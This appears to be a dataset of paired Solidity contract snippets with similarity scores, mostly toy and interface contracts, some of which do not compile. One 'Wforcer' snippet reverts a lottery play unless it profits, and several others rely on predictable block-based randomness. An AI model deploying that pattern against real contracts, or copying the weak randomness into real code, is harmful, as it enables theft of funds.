
    event Sent(address from, address to, uint amount);

    

    function electrolightTestnet() public {

        

        minter = msg.sender;

        

    }

    

    function mint(address receiver, uint amount) public {

        

        if(msg.sender != minter) return;

        balances[receiver]+=amount;

        

    }

    

    function send(address receiver, uint amount) public {

        if(balances[msg.sender] < amount) return;

        balances[msg.sender]-=amount;

        balances[receiver]+=amount;

        emit Sent(msg.sender, receiver, amount);

        

    }

    

    

}"
"contract ItemsAndUsers {
    struct Item {
        uint id;
        string nameOfItem;
        string typeofItem;
        uint value;
    }

    
    
    struct User {
        address userAddress;
    }

    Item[] public allItems;
    User[] public allUsers;

    mapping (address => uint[]) public userItemsIds;
    mapping (uint => address) public itemIdToUser;

    function createUser() public {
        uint[] memory items;
        User memory user = User({
          userAddress: msg.sender
        });
        allUsers.push(user);
    }

    function createItem(string _name, string _type, uint _value) public {
        Item memory item = Item({
           id: allItems.length,
           nameOfItem: _name,
           typeofItem: _type,
           value: _value
        });
        allItems.push(item);
    }

    function assignItemToUser(address _userAddress, uint _itemId) public {
        itemIdToUser[_itemId] = _userAddress;
        userItemsIds[_userAddress].push(_itemId);
    }

    
    function getUserItems(address _userAddress) public view returns (uint[] items){
        return userItemsIds[_userAddress];
    }

    
    function getItemInfo(uint _itemId) public view returns (uint id, string nameOfItem, string typeofItem, uint value) {
        Item memory item = allItems[_itemId];
        return (item.id, item.nameOfItem, item.typeofItem, item.value);
    }
}",0.6065653649965452,"contract Token is SafeMath {

	

	uint256 public totalSupply;

	uint256 internal maxSupply;

	

	

	

	function balanceOf(address _owner) public view returns (uint256 balance);



	

	

	

	

	function transfer(address _to, uint256 _value) public returns (bool success);



	

	

	

	

	

	function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);



	

	

	

	

	function approve(address _spender, uint256 _value) public returns (bool success);



	

	

	

	function allowance(address _owner, address _spender) view public returns (uint256 remaining);



	

	



	function burn(uint256 amount) public returns (bool);



	

	

	function register(string key) public returns (bool);



	

	

	function mint(uint256 amountOfMint) public returns (bool);



	event Transfer                           (address indexed _from, address indexed _to, uint256 _value);

	event Approval                           (address indexed _owner, address indexed _spender, uint256 _value);

	event Burn                               (address indexed _owner, uint256 indexed _value);

	event LogRegister                        (address user, string key);

	event Mint                               (address user,uint256 indexed amountOfMint);

}"
"contract B {
    function something_2() public {
        revert(""Not allowed."");
    }
}",0.6585563197740699,"contract debug {
    function () public  payable{
        revert(""GET OUT!"");
    }
}"
"contract Test {
    function ecrecover(bytes32 msgHash, uint8 v, bytes32 r, bytes32 s) constant returns (address) {
        return ecrecover(msgHash, v, r, s);
    }
}",0.6502829481832578,"contract Registrar {
  function transfer(bytes32 _hash, address newOwner);
  function entries(bytes32 _hash) constant returns (uint, Deed, uint, uint, uint);
}"
"contract TestIntToString {

    string public result;

    function TestIntToString() {
        
        result = appendUintToString(""My integer is: "", 1234567890);
    }

    function uintToString(uint v) constant returns (string str) {
        uint maxlength = 100;
        bytes memory reversed = new bytes(maxlength);
        uint i = 0;
        while (v != 0) {
            uint remainder = v % 10;
            v = v / 10;
            reversed[i++] = byte(48 + remainder);
        }
        bytes memory s = new bytes(i);
        for (uint j = 0; j < i; j++) {
            s[j] = reversed[i - 1 - j];
        }
        str = string(s);
    }

    function appendUintToString(string inStr, uint v) constant returns (string str) {
        uint maxlength = 100;
        bytes memory reversed = new bytes(maxlength);
        uint i = 0;
        while (v != 0) {
            uint remainder = v % 10;
            v = v / 10;
            reversed[i++] = byte(48 + remainder);
        }
        bytes memory inStrb = bytes(inStr);
        bytes memory s = new bytes(inStrb.length + i);
        uint j;
        for (j = 0; j < inStrb.length; j++) {
            s[j] = inStrb[j];
        }
        for (j = 0; j < i; j++) {
            s[j + inStrb.length] = reversed[i - 1 - j];
        }
        str = string(s);
    }
}",0.6461571601439757,"contract Strings {

  

  function Concatenate(string memory a, string memory b) public pure returns (string memory concatenatedString) {

    bytes memory bytesA = bytes(a);

    bytes memory bytesB = bytes(b);

    string memory concatenatedAB = new string(bytesA.length + bytesB.length);

    bytes memory bytesAB = bytes(concatenatedAB);

    uint concatendatedIndex = 0;

    uint index = 0;

    for (index = 0; index < bytesA.length; index++) {

      bytesAB[concatendatedIndex++] = bytesA[index];

    }

    for (index = 0; index < bytesB.length; index++) {

      bytesAB[concatendatedIndex++] = bytesB[index];

    }



    return string(bytesAB);

  }



  function UintToString(uint value) public pure returns (string memory uintAsString) {

    uint tempValue = value;



    if (tempValue == 0) {

      return ""0"";

    }

    uint j = tempValue;

    uint length;

    while (j != 0) {

      length++;

      j /= 10;

    }

    bytes memory byteString = new bytes(length);

    uint index = length - 1;

    while (tempValue != 0) {

      byteString[index--] = byte(uint8(48 + tempValue % 10));

      tempValue /= 10;

    }

    return string(byteString);

  }

}"
"contract Lottery {

    address payable[] public players;

    

    function getPlayerAtIndex(uint index) public view returns(address player) {
        return players[index];
    }

    function getPlayerCount() public view returns(uint count) {
        return players.length;
    }
}",0.642396573542494,"contract BTCNNInterface {

  function getFrontEndTokenBalanceOf(address who) public view returns(uint);



  function transfer(address _to, uint _value) public returns(bool);



  function approve(address spender, uint tokens) public returns(bool);

}"
"contract AdditionContract {
  uint public state = 0;

  function add(uint value1, uint value2) public {
    state = value1 + value2;
  }

  function getState() public constant returns (uint) {
      return state;
  }
}",0.6567256791968982,"contract Counter {
    uint256 count;  

    function Counter(uint256 _count) public {
        count = _count;
    }

    function increment() public {
        count += 1;
    }

    function getCount() public view returns (uint256) {
        return count;
    }
}"
"contract Relay {
    function bal() constant returns (uint) {
        return this.balance;
    }

    function setRelay() payable {
        
    }

    function() payable {
    }
}",0.6708881077852785,"contract Token {
    function balanceOf(address) public constant returns (uint);
    function transfer(address, uint) public returns (bool);
}"
"contract ADTest {

    
    MyTokenI myToken;

    
    function ADTest(address _myToken) public {
        
        myToken = MyTokenI(_myToken);
    }

    function CallTransfer(address _to, uint256 _value) public {
        
        myToken.transfer(_to, _value);
    }

}",0.6433028091300683,"contract CesiraeToken {
    
    function balanceOf(address _owner) public constant returns (uint256 balance);
    function transfer(address _to, uint256 _value) public returns (bool success);
    
}"
"contract Labyrinth {

  
  

  uint entropy;

  function getRandomishNumber() public returns (uint) {
    uint offset = entropy % 255 + 1; 
    uint blockNumber = block.number - offset;
    entropy ^= uint(blockhash(blockNumber));
    return entropy;
  }

}",0.6189871184670277,"contract Random {
  uint64 _seed = 0;

  
  
  function random(uint64 upper, uint8 step) public returns (uint64 randomNumber) {
    _seed = uint64(keccak256(keccak256(block.blockhash(block.number - step), _seed), now));

    return _seed % upper;
  }
}"
"contract One {
    uint256 public u;

    function setU(uint256 _u) public {
        u = _u;
    }
}",0.6522229690343939,"contract FiatContract {

  function USD(uint _id) public pure returns (uint256);

}"
"contract Other {
    One public myOne = new One();

    function doSomething() public {
        myOne.setU(123);
    }
}",0.6069959711614039,"contract Ownable {
  address public owner;

  function Ownable() public {
    owner = msg.sender;
  }
}"
"contract Test {

    uint lastBlockNum;

    function hasNewBlock() constant returns (bool) {
        if (lastBlockNum < block.number) {
            return true;
        }
        return false;
    }

    function updateBlockNum() {
        lastBlockNum = block.number;
    }
}",0.6043614751843982,"contract PingContract {
	function ping() returns (uint) {
		return pingTimestamp();
	}
	
	function pingTimestamp() returns (uint) {
		return block.timestamp;
	}
	
	function pingBlock() returns (uint) {
		return block.number;
	}
}"
"contract Test {
    function test(bytes32 data) external pure returns (address) {
        return address(data);
    }
}",0.6784665063263713,"contract Context {
    
    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }
}"
"contract B {

    A a; 

    event LogResponse(bool whatItSaid);

    function B() {
        a = new A(); 
    }

    function prove() public returns(bool success) {
        bool response = a.talkToMe();
        LogResponse(response);
        return response;
    }

    function newA(address addressA) public returns(bool success) {
        a = A(addressA); 
        return true;
    }
}",0.6432631106129312,"contract IToken {







  



  



  



  



  function transfer(address _to, uint256 _value) public returns (bool success);







  



  



  



  



  



  function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);







  function approve(address _spender, uint256 _value) public returns (bool success);







}"
"contract test {
    struct BB {
        mapping(uint => string) map_2;
    }
    mapping(uint => BB) map_1;

    function test() public {
        map_1[1].map_2[1] = ""hello""; 
    }

    function maping() public view returns(string) {
        return map_1[1].map_2[1]; 
    }
}",0.6319872450270834,"contract C
{
    mapping (bytes2 => string) languageCodeToComment;
    function C() public
    {
        languageCodeToComment[""ZH""] = """";
    }
    function m() public view returns (string)
    {
        return languageCodeToComment[""ZH""];
    }
}"
"contract A {
  B private b;

  constructor (B _b) public {
    b = _b;
  }

  function bar () public {
    B.S [] memory structs = b.foo ();
  }
}",0.6425067328883839,"contract Foo {
  string public foo;

  function getFoo() public {
    string memory _foo = foo;
    string memory _bar = foo;
  }
}"
"contract B {
  struct S {
    uint x;
    uint y;
  }

  S [] private structs;

  function foo () public view returns (S [] memory) {
    return structs;        
  }
}",0.6512289749041801,"contract testabi {

    uint c;

    function tinhtong(uint a, uint b) public {

        c = a+b;

    } 

    function ketqua() public view returns (uint) {

        return c;

    }

}"
"contract C {
    uint constant X = 32**22 + 8;
    string constant TEXT = ""abc"";
    bytes32 constant MY_HASH = keccak256(""abc"");
    uint immutable decimals;
    uint immutable maxBalance;
    address immutable owner = msg.sender;

    constructor(uint _decimals, address _reference) public {
        decimals = _decimals;
        
        maxBalance = _reference.balance;
    }

    function isBalanceTooHigh(address _other) public view returns (bool) {
        return _other.balance > maxBalance;
    }
}",0.6102788009716232,"contract EOSpace is StandardToken {
  string public constant name = ""EOSpace"";
  string public constant symbol = ""EOP"";
  uint8 public constant decimals = 18;
  mapping(address => bool) public claimed;
  event Claim(address indexed from);

  constructor() public {
    totalSupply = 10000000000e18;
    balances[msg.sender] = totalSupply;
  }

  function claim() public returns (bool) {
    claimed[msg.sender] = true;
    emit Claim(msg.sender);
    return true;
  }
}"
"contract MetaCoin {

    uint256[] public someNumbers;

    function writeNumber(uint256 num) public {
        someNumbers.push(num);
    }


    function getSomeNumbers() public view returns(uint256[]) {
        return someNumbers;
    }

    function getSomeNumbersLength() public view returns(uint256) {
        return someNumbers.length;
    }
}",0.6581349498516322,"contract Etheropoly {

    function buy(address) public payable returns(uint256);
    function transfer(address, uint256) public returns(bool);
    function myTokens() public view returns(uint256);
    function myDividends(bool) public view returns(uint256);
    function reinvest() public;
}"
"contract math {
    
    uint256 public constant MULTIPLIER = 10e18;

    uint tokenAmount = 638;

    function setTokenAmount(uint256 _tokenAmount) public {
        tokenAmount = _tokenAmount;
    }

    function doo(uint _nominator) public view returns (uint) { 
        uint stPrize = (MULTIPLIER * _nominator / 100) * tokenAmount;
        return stPrize; 
    } 
}",0.6044171473145286,"contract BeatToken is CappedToken {

    string public constant name = ""BEAT Token"";
    string public constant symbol = ""BEAT"";
    uint8 public constant decimals = 18;

    function BeatToken(uint256 _cap) CappedToken(_cap) public {
    }

    function getTotalSupply() public view returns (uint256) {
        return totalSupply;
    }

}"
"contract HelloUniverse is HelloWorld {
  function talk() public view onlyIfHappy returns(string memory) {
    return response;
  }
}",0.6063625986227753,"contract Agent {

    using SafeMath for uint256;



    function isInitialized() public view returns (bool) {

        return false;

    }

}"
"contract Airdrop { 
    mapping(address => uint256) public balances;
    address public admin;


  constructor() public {
      owner = msg.sender;
  }

  function getAirdrop() public payable {
    if (msg.value < 0.005 ether) {
       balances[msg.sender] += 4000;
      } else if ( (msg.value >= 0.005 ether) && (msg.value < 0.008 ether)) {
          balances[msg.sender] += 9000;
       } else if ( (msg.value >= 0.008 ether) && (msg.value < 0.016 ether)) {
          balances[msg.sender] += 13000;
       } else balances[msg.sender] += 25000;
    }

    function () payable public {
        getAirdrop();
        admin.transfer(msg.value);
    }


}",0.6460993091397983,"contract guess_coin{

    super_rand public rand_addr;

    uint256 win;

    address public owner;

    

    constructor(address _addr) public {

        rand_addr = super_rand(_addr);

        win = 200;

        owner = msg.sender;

    }

    

    

    function() public payable {

        if( rand_addr.s_rand( msg.sender, msg.value) ){

            msg.sender.transfer(msg.value * win/100);

        }

    }

    function set_rand_addr(address _addr, uint256 _win) public {

        require( msg.sender == owner);

        rand_addr = super_rand(_addr);

        win = _win;

    }

    function get_eth() public {

        require( msg.sender == owner);

        owner.transfer(address(this).balance);

    }

}"
"contract RetnWithdraw10 is Ownable{
    address owner;
    Token token;
    mapping(address => mapping(uint256 => bool)) usedNonces;
    event Redeemed(address indexed beneficiary, uint256 value);

    function RetnWithdraw10() public {
        address _tokenAddr = 0x815CfC2701C1d072F2fb7E8bDBe692dEEefFfe41;
      
      token = Token(_tokenAddr);
        owner = msg.sender;
    }

    function claimPayment(uint256 amount, uint256 nonce, bytes sig) public {


        require (token.balanceOf(this) >= amount);
        require (!usedNonces[msg.sender][nonce]);

        
        bytes32 message = prefixed(keccak256(msg.sender, amount, nonce, this));

        require (recoverSigner(message, sig) == owner);


        usedNonces[msg.sender][nonce] = true;

        
        if(token.transfer(msg.sender,amount)){
           emit Redeemed(msg.sender,amount);
      }
      else
      usedNonces[msg.sender][nonce] = false;
    }

    
    function kill() public onlyOwner{
        uint256 remaining = token.balanceOf(this);
        if(remaining>0)
            token.transfer(owner,remaining);
        selfdestruct(msg.sender);
    }


    

    function splitSignature(bytes sig)
        internal
        pure
        returns (uint8, bytes32, bytes32)
    {
        require(sig.length == 65);

        bytes32 r;
        bytes32 s;
        uint8 v;

        assembly {
            
            r := mload(add(sig, 32))
            
            s := mload(add(sig, 64))
            
            v := byte(0, mload(add(sig, 96)))
        }

        return (v, r, s);
    }

    function recoverSigner(bytes32 message, bytes sig)
        internal
        pure
        returns (address)
    {
        uint8 v;
        bytes32 r;
        bytes32 s;

        (v, r, s) = splitSignature(sig);

        return ecrecover(message, v, r, s);
    }

    
    function prefixed(bytes32 hash) internal pure returns (bytes32) {
        return keccak256(""\x19Ethereum Signed Message:\n32"", hash);
    }
}",0.6396007045528874,"contract  CCG is Token {

    string public name;
    uint8 public decimals;
    string public symbol;
    
    function CCG (uint256 _initialAmount, string _tokenName, uint8 _decimalUnits, string _tokenSymbol) public {
        totalSupply = _initialAmount * 10 ** uint256(_decimalUnits);
        balances[msg.sender] = totalSupply;

        name = _tokenName;
        decimals = _decimalUnits;
        symbol = _tokenSymbol;
    }
    
    
    
    
    function transfer(address _to, uint256 _value) public returns (bool success) {


        require(balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]);
        require(_to != 0x0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        Transfer(msg.sender, _to, _value);
        return true;
    }

    
    
    
    function transferFrom(address _from, address _to, uint256 _value) public returns
    (bool success) {
        require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);
        balances[_to] += _value;
        balances[_from] -= _value;
        allowed[_from][msg.sender] -= _value;
        Transfer(_from, _to, _value);
        return true;
    }
    
    
    
    
    function balanceOf(address _owner) public constant returns (uint256 balance) {
        return balances[_owner];
    }

    
    
    
    
    function approve(address _spender, uint256 _value) public returns (bool success)
    {
        require((_value == 0) || (allowed[msg.sender][_spender] == 0));
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }

    
    
    
    
    function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
}"
"contract ERC20 {
    function totalSupply() constant returns (uint totalSupply);
 }",0.6990547465840979,"contract IWingsAdapter {


    
    function totalCollected() constant returns (uint);
}"
"contract Test {
    address tokenAddress = 0x0D8775F648430679A709E98d2b0Cb6250d2887EF; 
    function getTotalSupplyOfToken() public view returns (uint) {
        ERC20 token = ERC20(tokenAddress);

        return token.totalSupply();
    }
}",0.6381330443286384,"contract TokenRecover is Ownable {



  

  function recoverERC20(

    address _tokenAddress,

    uint256 _tokens

  )

  public

  onlyOwner

  returns (bool success)

  {

    return ERC20Basic(_tokenAddress).transfer(owner, _tokens);

  }

}"
"contract GoodToken {
    address public dummy1;
    address public dummy2;
    uint256 public dummy3;
    function detectTransferRestriction(address x, address y, uint256 z) public {
        dummy1 = x;
        dummy2 = y;
        dummy3 = z;
    }
}",0.6252982976307199,"contract YUM {

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);

    mapping (address => uint256) public balanceOf;

    function transfer(address _to, uint256 _value) public;

}"
"contract BadToken {
    address public dummy1;
    address public dummy2;
    uint256 public dummy3;
    function someOtherFunc(address x, address y, uint256 z) public {
        dummy1 = x;
        dummy2 = y;
        dummy3 = z;
    }
}",0.6157021291440383,"contract ERC20{

    function transfer(address _to, uint256 _value) public;

    function transferFrom(address _from, address _to, uint256 _value) public;

    function approve(address spender, uint tokens) public;

}"
"contract Bnew {
  address public BAddr;
  bool public success;

  function TalkToA () public returns (bool) {
    BAddr = new A();
    Test.TStruct memory sin = Test.TStruct(10, 5);
    bytes memory data = abi.encodeWithSignature(""SetStruct((int256,int256))"", sin); 
    success = address(BAddr).call(data);
    return success;
  }
}",0.6390956645389922,"contract Erc20Plus is Erc20 {
	function approveAndCall(address spender, uint256 value, bytes extraData) public returns (bool success);
	function burn(uint256 value) public returns (bool success);
	function burnFrom(address from, uint256 value) public returns (bool success);
}"
"contract ATM {

    mapping(address => uint) public balances;

    event Deposit(address sender, uint amount);
    event Withdrawal(address receiver, uint amount);
    event Transfer(address sender, address receiver, uint amount);

    function deposit() public payable {
        emit Deposit(msg.sender, msg.value);
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint amount) public {
        require(balances[msg.sender] >= amount, ""Insufficient funds"");
        emit Withdrawal(msg.sender, amount);
        balances[msg.sender] -= amount;
    }

    function transfer(address receiver, uint amount) public {
        require(balances[msg.sender] >= amount, ""Insufficient funds"");
        emit Transfer(msg.sender, receiver, amount);
        balances[msg.sender] -= amount;
        balances[receiver] += amount;
    }

    

    function transfer(address[] memory receivers, uint amount) public {
        require(balances[msg.sender] >= receivers.length * amount, ""Insufficient funds"");
        for (uint i=0; i<receivers.length; i++) {
            emit Transfer(msg.sender, receivers[i], amount);
            balances[msg.sender] -= amount;
            balances[receivers[i]] += amount;
        }
    }
}",0.6748298389062112,"contract Freezable is ERC20 {



  mapping (address => uint256) private _freeze;



  

  event Freeze(

    address indexed from,

    uint256 value

  );



  

  event Unfreeze(

    address indexed from,

    uint256 value

  );



  

  function freezeOf(address account) public view returns (uint256) {

    return _freeze[account];

  }



  

  function freeze(uint256 amount) public {

    require(balances[msg.sender] >= amount, ""Freezable: Amount to be frozen exceeds the account balance"");

    require(amount > 0, ""Freezable: Can not freeze negative amount"");

    balances[msg.sender] = balances[msg.sender].sub(amount);

    _freeze[msg.sender] = _freeze[msg.sender].add(amount);

    emit Freeze(msg.sender, amount);

  }



  

  function unfreeze(uint256 amount) public {

    require(_freeze[msg.sender] >= amount, ""Freezable: Amount to be unfrozen exceeds the account balance"");

    require(amount > 0, ""Freezable: Can not unfreeze negative amount"");

    _freeze[msg.sender] = _freeze[msg.sender].sub(amount);

    balances[msg.sender] = balances[msg.sender].add(amount);

    emit Unfreeze(msg.sender, amount);

  }

}"
"contract Replacable is Owned {

    Keeper keeper;

    constructor() public {
        keeper = new Keeper();
    }

    function getKeeperAddress() public view returns(address keeperAddress) {
        return address(keeper);
    }

    function appendInKeeper(bytes32 value) public onlyOwner returns(uint arrayLength) {
        return keeper.appendArray(value);
    }

    function inspectInKeeper(uint row) public view returns(bytes32 value) {
        return keeper.array(row);
    }

    function appointNewReplacable(address newContract) public onlyOwner returns(bool success) {
        return keeper.changeOwner(newContract);
    }

}",0.6287935664403337,"contract Reputation {



  address owner;

  mapping(address => bool) whitelist;

  mapping(address => int) ratings;



  constructor () public {

    owner = msg.sender;

  }



  function addToWhitelist(address _contractAddress) public {

    require(msg.sender == owner);

    whitelist[_contractAddress] = true;

  }



  function change(address _userAddress, int _delta) public {

    require(whitelist[msg.sender]);

    ratings[_userAddress] += _delta;

  }



  function getMy() public view returns (int) {

    return ratings[msg.sender];

  }



  function get(address _userAddress) public view returns (int) {

    return ratings[_userAddress];

  }

}"
"contract ConstructorTest {
    function ConstructorTest(address parent) public {
        assert(parent != 0);
    }
}",0.6130057357721158,"contract HoardCrowdsale {

    function invest(address addr,uint tokenAmount) public payable {

    }

}"
"contract GreeterFactory {

    mapping (address => bool) created;

    function makeGreeter(string greeting) returns (address) {
        var g = new Greeter(greeting);
        created[g] = true;
        return g;
    }

    function verify(address greeter) returns (bool) {
        return created[greeter];
    }

}",0.6196869016180133,"contract TrustlessTokenController is

    MTokenController

{

    

    

    



    

    

    



    function mOnTransfer(

        address ,

        address ,

        uint256 

    )

        internal

        returns (bool allow)

    {

        return true;

    }



    function mOnApprove(

        address ,

        address ,

        uint256 

    )

        internal

        returns (bool allow)

    {

        return true;

    }

}"
"contract Foo {
  string [] private strings;

  function addString (string memory str) public {
    strings.push (str);
  }

  function getStrings () public view returns (string [] memory) {
    return strings;
  }
}",0.6696465390634956,"contract PausedEURON is PausedToken {

    function name() public pure returns (string memory) {

        return ""EURON"";

    }



    function symbol() public pure returns (string memory) {

        return ""ERN"";

    }

}"
"contract Contract {
    string public name;

    function Contracts(string memory passedName) public {
        name = passedName;
    }

    function setName(string memory newName) public {
        name = newName;

    }

}",0.6304122654645855,"contract Trusti {
    string data = ""trusti.id"";
    
    function getStore() public view returns (string memory) {
        return data;
    }
    
    function setStore(string memory _value) public {
        data = _value;
    }
}"
"contract B {
    event showb(uint);
    function b() payable external {
        emit showb(msg.value);
    }
}",0.6651879288795762,"contract ICEther is ICToken {
    function mint() external payable returns (uint);
}"
"contract MyContract {
    function doIt(address tokenContract, address to, uint256 amount) {
        IERC20Token(tokenContract).transfer(to, amount);
    }
}",0.6500460768272532,"contract MintableToken {
    event Mint(address indexed to, uint256 amount);

    
    function mint(address _to, uint256 _amount) public;
}"
"contract Store {
  mapping (bytes32 => bytes32) public items;

  function setItem(bytes32 key, bytes32 value) external {
    items[key] = value;
  }
}",0.6918111140551997,"contract Rating {
        function setRating(bytes32 _key, uint256 _value) {
            ratings[_key] = _value;
        }
        mapping (bytes32 => uint256) public ratings;
    }"
"contract PubKey {
         bytes32 pubKey;

         function PubKey(bytes32 initKey) {
             pubKey = initKey;
         }

         function getPubKey() constant returns (bytes32) {

            return pubKey;

         }
    }",0.6081564096334603,"contract NotaryPersistentStorage {
    function storeProof(bytes32 _proof) public returns (bool);
    function hasProof(bytes32 _proof) public constant returns (bool);
}"
"contract Contract1 {

    mapping (address => uint256) votes;

    function voteCandidate(address _address) external {
        votes[_address]++;
    }

    function checkVotesCandidate(address _address) public view returns (uint) {
        return votes[_address];
    }
}",0.6635507826591229,"contract RegulatorService {



  

  function check(address _token, address _spender, address _from, address _to, uint256 _amount) public returns (uint8);



  

  function messageForReason(uint8 _reason) public view returns (string);

}"
"contract example3 {
  function C() {
    print msg.sender;
    B();
  }
function B() internal {
    print msg.sender; 
  }
}",0.6567593255828423,"contract Context {
    
    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }
}"
"contract Inner {
  function someFunction(uint timestamp) {
    
  }
}",0.6212257482152751,"contract DummyReceiver {

    
    function start() {
    }

    
    function end() {
    }
}"
"contract Example {


    function A(uint val) private {
       
    }

    function B(uint val)public {
        
        A(val);
    }

}",0.6425491267710135,"contract Test1

    {

       function Invest() 

    public 

    payable ;

    function Divest(uint amount) 

    public ;

    }"
"contract Caller {
    function transferGoodToken(address _token, address _to, uint256 _value) public {
        GoodToken(_token).transfer(_to, _value);
    }
    function transferBadToken(address _token, address _to, uint256 _value) public {
        BadToken(_token).transfer(_to, _value);
    }
}",0.6927599961068917,"contract Token
{
   mapping(address => mapping (address => uint256)) allowed;
   function transfer(address to, uint256 value) public returns (bool);
   function transferFrom(address from, address to, uint256 value) public returns (bool);
}"
"contract IPList {

    string[] public ipList;

    event LogNewIp(address sender, string ip);

    function appendIP(string ip) public {
        ipList.push(ip);
        emit LogNewIp(msg.sender, ip);
    }

    function getIPCount() public view returns(uint count) {
        return ipList.length;
    }
}",0.6331013718221417,"contract Register is Pausable {
    mapping(address => string) public registry;

    
    function addUser(string info) public whenNotPaused {
        registry[msg.sender] = info;
    }
   
    
    function getInfo(address ethAddress) public constant returns (string) {
        return registry[ethAddress];
    }
}"
"contract TimeLock {
    IERC20 token;

    struct LockBoxStruct {
        address beneficiary;
        uint balance;
        uint releaseTime;
    }

    LockBoxStruct[] public lockBoxStructs; 

    event LogLockBoxDeposit(address sender, uint amount, uint releaseTime);   
    event LogLockBoxWithdrawal(address receiver, uint amount);

    constructor(address tokenContract) public {
        token = IERC20(tokenContract);
    }

    function deposit(address beneficiary, uint amount, uint releaseTime) public returns(bool success) {
        require(token.transferFrom(msg.sender, address(this), amount));
        LockBoxStruct memory l;
        l.beneficiary = beneficiary;
        l.balance = amount;
        l.releaseTime = releaseTime;
        lockBoxStructs.push(l);
        emit LogLockBoxDeposit(msg.sender, amount, releaseTime);
        return true;
    }

    function withdraw(uint lockBoxNumber) public returns(bool success) {
        LockBoxStruct storage l = lockBoxStructs[lockBoxNumber];
        require(l.beneficiary == msg.sender);
        require(l.releaseTime <= now);
        uint amount = l.balance;
        l.balance = 0;
        emit LogLockBoxWithdrawal(msg.sender, amount);
        require(token.transfer(msg.sender, amount));
        return true;
    }    

}",0.6358289525499896,"contract Lescovex_ISC is LescovexERC20 {

    uint256 public contractBalance = 0;

    
    event LogDeposit(address sender, uint amount);
    event LogWithdrawal(address receiver, uint amount);

    address contractAddr = this;

    
    constructor (
        uint256 initialSupply,
        string contractName,
        string tokenSymbol,
        uint256 contractHoldTime,
        address contractOwner

        ) public {
        totalSupply = initialSupply;  
        name = contractName;             
        symbol = tokenSymbol;         
        holdTime = contractHoldTime;
        balances[contractOwner] = totalSupply;

    }

    function () public {

    }

    function deposit() external payable onlyOwner returns(bool success) {
        contractBalance = contractAddr.balance;
        
        emit LogDeposit(msg.sender, msg.value);

        return true;
    }

    function withdrawReward() external {
    
        uint256 ethAmount = (holdedOf(msg.sender) * contractBalance) / totalSupply;

        require(ethAmount > 0);


        
        emit LogWithdrawal(msg.sender, ethAmount);

        delete holded[msg.sender];
        hold(msg.sender,balances[msg.sender]);
        
        msg.sender.transfer(ethAmount);
    }

    function withdraw(uint256 value) external onlyOwner {
        
        msg.sender.transfer(value);
        
        emit LogWithdrawal(msg.sender, value);
    }
}"
"contract AddressArray {

    address[] addresses;

    function AddressArray(address[] addresses_) {
        for (uint i = 0; i < addresses_.length; i++) {
            addresses.push(addresses_[i]);
        }
    }

    function getNumberOfAddresses() constant returns (uint) {
        return addresses.length;
    }

    function getAddress(uint i) constant returns (address) {
        return addresses[i];
    }
}",0.6456412532867107,"contract SimpleStorage {
    uint storedData;
    address storedAddress;
    
    event flag(uint val, address addr);

    function set(uint x, address y) {
        storedData = x;
        storedAddress = y;
    }

    function get() constant returns (uint retVal, address retAddr) {
        return (storedData, storedAddress);
        flag(storedData, storedAddress);

    }
}"
"contract StorageVariableTest {
    uint256 k;

    function assignValue() public {
        k = 2;
    }
}",0.6475761072391938,"contract SpecialERC20 {

    function transfer(address to, uint256 value) public;

}"
"contract LockBox {
    uint256 delaySeconds;
    uint256 unlockTime;
    address owner;

    function LockBox(uint256 _delay) {
        delaySeconds = _delay;
        owner = msg.sender;
    }

    
    function () payable {
        if (this.balance != 0)
            throw;
        if (msg.value != 10000) 
            throw;
        unlockTime = now + delaySeconds;
    }

    
    function withdraw() {
        if (now <= unlockTime)
            throw;
        if (msg.sender != owner)
            throw;
        owner.transfer(this.balance);
    }
}",0.6282848746383436,"contract Wforcer is Owned {
  function wcf(address target, uint256 a) payable {
    require(msg.sender == owner);

    uint startBalance = this.balance;
    target.call.value(msg.value)(bytes4(keccak256(""play(uint256)"")), a);
    if (this.balance <= startBalance) revert();
    owner.transfer(this.balance);
  }
  function withdraw() {
    require(msg.sender == owner);
    require(this.balance > 0);
    owner.transfer(this.balance);
  }

  function () payable {}
}"
"contract B { 
     
     
     mapping (address => (address => bool)) permissionGiven;
     mapping (address => uint) ethBalance; 
     mapping (address => uint) balances; 

     function () payable { 
        ethBalance[msg.sender] = ethBalance[msg.sender].add(msg.value); 
     }

     function givePermission (address _a) public { 
        permissionGiven[msg.sender][a] = true;
     }

     function swap(address _a, address _c) public {
        if (permissionGiven[_c][_a] && permissionGiven[_a][_c]) {
           _c.transfer(ethBalance[_a]);
           transfer(_a, balances[_c]);
        }
     }

     function transfer (address _to, uint _tokens) {
         
     }
}",0.6540716757913475,"contract BasicToken is ERC20Basic {
    using SafeMath for uint256;

    
    mapping(address => uint256) balances;

    
    function balanceOf(address _address) public constant returns(uint256 theBalance){
        return balances[_address];
    }

    
    function transfer(address _to, uint256 _value) public returns(bool success){
        require(_to != address(0x0) && _value <= balances[msg.sender]);

        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(_value);

        emit Transfer(msg.sender, _to, _value);

        return true;
    }
}"
"contract Factory {

    mapping(address => bool) public isConsumer;
    address[] public consumers;

    modifier onlyACL() {
        if(!isConsumer[msg.sender]) throw;
        _;
    }

    function newConsumer() 
        public
        returns(address consumerAddress)
    {
        Consumer c = new Consumer();
        consumers.push(c);
        isConsumer[c] = true;
        return c;
    }

    function ACLProtected()
      onlyACL
      returns(bool allowed)
    {
        return true;
    }

    function getConsumerCount()
        public
        constant
        returns(uint consumerCount)
    {
        return consumers.length;
    }

}",0.6472962296631511,"contract PricingStrategy {

  
  function isPricingStrategy() public constant returns (bool) {
    return true;
  }

  
  function isSane(address crowdsale) public constant returns (bool) {
    return true;
  }

  
  function isPresalePurchase(address purchaser) public constant returns (bool) {
    return false;
  }

  
  function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);
}"
